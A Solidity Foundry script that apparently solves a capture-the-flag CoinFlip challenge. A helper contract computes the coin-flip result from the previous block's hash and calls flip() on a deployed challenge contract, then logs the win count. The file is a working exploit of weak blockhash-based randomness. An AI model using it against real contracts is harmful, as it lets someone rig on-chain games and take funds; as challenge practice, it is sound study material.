// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {CoinFlip} from "../src/Coin_Flip.sol";
import "forge-std/console.sol";

contract Player {

    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor (CoinFlip _coinFlipInstance) {

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _coinFlipInstance.flip(side);
    }
    

}

contract CoinFlipSolution is Script {

    CoinFlip public coinFlip = CoinFlip(0x5c93a028284686e89d89F1b631C86fd6A4875959);

    function run() external {
        vm.startBroadcast();
        new Player(coinFlip);
        console.log("Number of consecutive wins: ", coinFlip.consecutiveWins());
        console.log(uint256(blockhash(block.number - 1)));
        vm.stopBroadcast();
    }

}